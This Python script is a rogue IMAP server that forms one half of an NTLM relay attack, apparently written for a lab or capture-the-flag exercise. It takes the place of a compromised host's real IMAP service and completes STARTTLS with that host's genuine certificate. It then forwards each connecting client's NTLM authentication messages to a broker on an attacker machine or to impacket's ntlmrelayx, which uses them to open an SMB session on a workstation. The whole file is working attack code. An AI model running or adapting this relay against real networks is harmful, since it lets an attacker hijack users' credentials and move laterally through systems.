#!/usr/bin/env python3
"""
imap_capture.py  --  IMAP side of the IMAP->SMB NTLM relay.

Runs on the OWNED gromox host (172.16.20.10) in place of the real IMAP
listener. Serves a minimal IMAP endpoint that:

  * advertises STARTTLS and completes it with the host's REAL cert/key,
    so the WS02 poller validates the TLS normally;
  * advertises AUTH=NTLM and, when the client runs AUTHENTICATE NTLM,
    forwards the client's NTLMSSP Type 1 / Type 3 to the broker on Kali
    (imap_relay_broker.py) and relays the broker's Type 2 back, so the
    client's NTLM authenticates a parallel SMB session against WS02.

Bind requires the real IMAP port to be free -- run under relay_wrapper.sh,
which stops gromox-imap first and restarts it on exit.

Authorized lab / CTF use only.
"""
import argparse
import base64
import json
import socket
import ssl
import struct
import sys
import threading
import time
import traceback


def log(msg):
    print(f"[{time.strftime('%H:%M:%S')}] {msg}", flush=True)

CERT = "/etc/grommunio-common/ssl/server-bundle.pem"
KEY = "/etc/grommunio-common/ssl/server.key"

BROKER_HOST = None
BROKER_PORT = 1144
RAW_MODE = False          # True = talk to impacket ntlmrelayx RAW server

GREETING = b"* OK [CAPABILITY IMAP4rev1 STARTTLS LOGINDISABLED] IMAP ready\r\n"
CAPS_PLAIN = b"* CAPABILITY IMAP4rev1 STARTTLS LOGINDISABLED\r\n"
CAPS_TLS = b"* CAPABILITY IMAP4rev1 AUTH=NTLM\r\n"


# ---- broker wire protocol (length-prefixed JSON) --------------------------

def _broker_connect():
    s = socket.create_connection((BROKER_HOST, BROKER_PORT), timeout=30)
    return s


def _send_msg(sock, obj):
    body = json.dumps(obj).encode("utf-8")
    sock.sendall(struct.pack(">I", len(body)) + body)


def _recv_n(sock, n):
    buf = b""
    while len(buf) < n:
        chunk = sock.recv(n - len(buf))
        if not chunk:
            return None
        buf += chunk
    return buf


def _recv_msg(sock):
    hdr = _recv_n(sock, 4)
    if hdr is None:
        return None
    (length,) = struct.unpack(">I", hdr)
    return json.loads(_recv_n(sock, length).decode("utf-8"))


# ---- line IO over a (possibly TLS-wrapped) socket -------------------------

def readline(sock):
    buf = b""
    while not buf.endswith(b"\r\n"):
        ch = sock.recv(1)
        if not ch:
            break
        buf += ch
    return buf


def tls_context():
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    ctx.load_cert_chain(certfile=CERT, keyfile=KEY)
    return ctx


def _get_type1(sock, inline_ir):
    """Return the client's base64 Type 1, from inline SASL-IR or a continuation."""
    if inline_ir:
        return inline_ir.strip()
    sock.sendall(b"+ \r\n")               # empty continuation
    return readline(sock).strip()


def handle_authenticate(sock, tag, inline_ir=b""):
    """Drive AUTHENTICATE NTLM, bridging Type 1/2/3 to the relay backend.

    inline_ir: optional SASL initial-response (RFC 4959) base64 Type 1 on the
    same line as `AUTHENTICATE NTLM <blob>`; handled so SASL-IR clients do not
    desync. Backend is either the custom JSON broker or (RAW_MODE) impacket's
    ntlmrelayx RAW server.
    """
    log(f"AUTHENTICATE NTLM start (inline_ir={'yes' if inline_ir else 'no'}, "
        f"raw={RAW_MODE})")
    try:
        if RAW_MODE:
            _relay_raw(sock, tag, inline_ir)
        else:
            _relay_json(sock, tag, inline_ir)
    except Exception:  # noqa: BLE001
        log("[-] handle_authenticate exception:\n" + traceback.format_exc())


def _relay_raw(sock, tag, inline_ir):
    """Bridge NTLM to impacket ntlmrelayx RAW server.

    RAW wire (rawrelayserver.py): <len:short><Type1> -> <len:short><Type2>
    -> <len:short><Type3> -> <len:short=1><ok:1-byte-bool>. Lengths are
    native-order shorts; blobs are RAW NTLM bytes (not base64).
    """
    try:
        r = socket.create_connection((BROKER_HOST, BROKER_PORT), timeout=30)
    except Exception as e:  # noqa: BLE001
        log(f"[-] RAW RELAY CONNECT FAILED {BROKER_HOST}:{BROKER_PORT}: {e}")
        sock.sendall(tag + b" NO relay backend unreachable\r\n")
        return
    try:
        t1 = base64.b64decode(_get_type1(sock, inline_ir))
        log(f"got Type1 ({len(t1)} B) -> RAW relay")
        r.sendall(struct.pack("<h", len(t1)) + t1)
        (n2,) = struct.unpack("<h", _recv_n(r, 2))
        t2 = _recv_n(r, n2)                       # Type 2 from the SMB target
        sock.sendall(b"+ " + base64.b64encode(t2) + b"\r\n")
        t3 = base64.b64decode(readline(sock).strip())
        log(f"got Type3 ({len(t3)} B) -> RAW relay")
        r.sendall(struct.pack("<h", len(t3)) + t3)
        _recv_n(r, 2)                             # trailing len (always 1)
        (ok,) = struct.unpack("?", _recv_n(r, 1))
        if ok:
            log("[+] relayed NTLM OK (RAW): ntlmrelayx has the session")
            sock.sendall(tag + b" OK AUTHENTICATE completed\r\n")
        else:
            log("[-] RAW relay reported auth failure")
            sock.sendall(tag + b" NO AUTHENTICATE failed\r\n")
    finally:
        r.close()


def _relay_json(sock, tag, inline_ir):
    """Bridge NTLM to the custom JSON broker (imap_relay_broker.py)."""
    try:
        broker = _broker_connect()
    except Exception as e:  # noqa: BLE001
        log(f"[-] BROKER CONNECT FAILED to {BROKER_HOST}:{BROKER_PORT}: {e}")
        sock.sendall(tag + b" NO relay broker unreachable\r\n")
        return
    try:
        type1_b64 = _get_type1(sock, inline_ir)
        log(f"got Type1 ({len(type1_b64)} b64) -> broker")
        _send_msg(broker, {"type": "negotiate", "blob": type1_b64.decode()})
        resp = _recv_msg(broker)
        if not resp or resp.get("type") != "challenge":
            sock.sendall(tag + b" NO relay negotiate failed\r\n")
            return
        sock.sendall(b"+ " + resp["blob"].encode() + b"\r\n")
        type3_b64 = readline(sock).strip()
        log(f"got Type3 ({len(type3_b64)} b64) -> broker")
        _send_msg(broker, {"type": "authenticate", "blob": type3_b64.decode()})
        result = _recv_msg(broker)
        if result and result.get("success"):
            log(f"[+] relayed NTLM OK: {result.get('detail')}")
            sock.sendall(tag + b" OK AUTHENTICATE completed\r\n")
        else:
            log(f"[-] relay failed: {(result or {}).get('detail', 'unknown')}")
            sock.sendall(tag + b" NO AUTHENTICATE failed\r\n")
    finally:
        broker.close()


def serve_client(conn, addr):
    log(f"IMAP client CONNECTED {addr[0]}:{addr[1]}")
    sock = conn
    try:
        sock.sendall(GREETING)
        while True:
            line = readline(sock)
            if not line:
                log("client closed / empty read")
                break
            log("C: " + repr(line.strip()[:120]))
            parts = line.strip().split(b" ", 2)
            if len(parts) < 2:
                continue
            tag, cmd = parts[0], parts[1].upper()
            arg = parts[2] if len(parts) > 2 else b""
            if cmd == b"CAPABILITY":
                is_tls = isinstance(sock, ssl.SSLSocket)
                sock.sendall(CAPS_TLS if is_tls else CAPS_PLAIN)
                sock.sendall(tag + b" OK CAPABILITY completed\r\n")
            elif cmd == b"STARTTLS":
                sock.sendall(tag + b" OK Begin TLS negotiation now\r\n")
                sock = tls_context().wrap_socket(sock, server_side=True)
                log("STARTTLS upgraded (real cert)")
            elif cmd == b"AUTHENTICATE" and arg.upper().startswith(b"NTLM"):
                # arg is e.g. b"NTLM" or b"NTLM <base64 initial response>"
                ir = arg.split(b" ", 1)
                inline = ir[1] if len(ir) > 1 else b""
                handle_authenticate(sock, tag, inline)
            elif cmd == b"LOGOUT":
                sock.sendall(b"* BYE\r\n" + tag + b" OK LOGOUT completed\r\n")
                break
            else:
                sock.sendall(tag + b" NO unsupported\r\n")
    except Exception:  # noqa: BLE001
        log("[-] client error:\n" + traceback.format_exc())
    finally:
        try:
            sock.close()
        except Exception:  # noqa: BLE001
            pass


def main():
    global BROKER_HOST, BROKER_PORT, CERT, KEY
    ap = argparse.ArgumentParser(description="Rogue IMAP NTLM capture/relay front-end")
    ap.add_argument("--broker", required=True,
                    help="relay backend host (JSON broker, or ntlmrelayx RAW server)")
    ap.add_argument("--broker-port", type=int, default=1144)
    ap.add_argument("--raw", action="store_true",
                    help="talk impacket ntlmrelayx RAW server instead of the JSON broker "
                         "(set --broker-port to the RAW port, default ntlmrelayx RAW is 6666)")
    ap.add_argument("--listen", default="0.0.0.0")
    ap.add_argument("--port", type=int, default=143,
                    help="IMAP port to bind (143 cleartext+STARTTLS)")
    ap.add_argument("--cert", default=CERT)
    ap.add_argument("--key", default=KEY)
    args = ap.parse_args()
    global RAW_MODE
    BROKER_HOST, BROKER_PORT = args.broker, args.broker_port
    RAW_MODE = args.raw
    CERT, KEY = args.cert, args.key

    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind((args.listen, args.port))
    srv.listen(16)
    print(f"[*] rogue IMAP on {args.listen}:{args.port}, broker {BROKER_HOST}:{BROKER_PORT}")
    try:
        while True:
            conn, addr = srv.accept()
            threading.Thread(target=serve_client, args=(conn, addr),
                             daemon=True).start()
    except KeyboardInterrupt:
        print("\n[*] shutting down")
    finally:
        srv.close()


if __name__ == "__main__":
    main()
